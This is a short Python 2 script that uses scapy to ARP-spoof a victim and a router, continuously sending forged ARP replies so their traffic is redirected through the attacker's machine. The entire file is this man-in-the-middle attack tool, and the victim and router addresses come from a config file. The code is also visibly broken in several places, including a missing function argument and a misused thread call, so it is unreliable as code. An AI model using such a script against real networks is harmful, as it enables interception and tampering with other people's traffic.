#!/usr/bin/python

import ConfigParser, time, thread, sys, signal, logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *


# def readConfig():
#     config = ConfigParser.ConfigParser()
#     config.read('arp.config')
#     # ourMac = config.get('ARP','ourmac')
#     # print mac
#     for option, value in config.items('ARP'):
#     	print option, value
def signalHandler(signal, frame):
	print ('Ctrl+C bitch...')
	sys.exit(0)

def configSectionMap(section):
	dict = {}
	config = ConfigParser.ConfigParser()
	config.read('arp.config')
	options = config.options(section)
	for option in options:
		try:
			dict[option] = config.get(section, option)
			if dict[option] == -1:
				DebugPrint("skip: %s" % option)
		except:
			print ("exception on %s!" % option)
			dict[option] = None
	return dict


def arpSpoof(routerIP, routerMAC, victimIP, victimMAC, ourMAC):
    arpPacketVictim = Ether(src=ourMAC, dst=victimMAC)/ARP(hwsrc=ourMAC, 
                                hwdst=victimMAC, psrc=routerIP, pdst=victimIP, op=2)

    arpPacketRouter = Ether(src=ourMAC, dst=routerMAC)/ARP(hwsrc=ourMAC, 
                                hwdst=routerMAC, psrc=victimIP, pdst=routerIP, op=2)
    while 1:
	    send(arpPacketVictim)
	    send(arpPacketRouter)
	    time.sleep(1)


def main():
	variables = configSectionMap()
	thread.start_new_thread(arpSpoof(variables['routerip'], variables['routermac'], variables['victimip'], variables['victimmac'], variables['ourmac']))
	signal.signal(signal.SIGINT, signalHandler)
	print ('press ctrl+c')
	signal.pause()

if __name__ == '__main__':
	main()







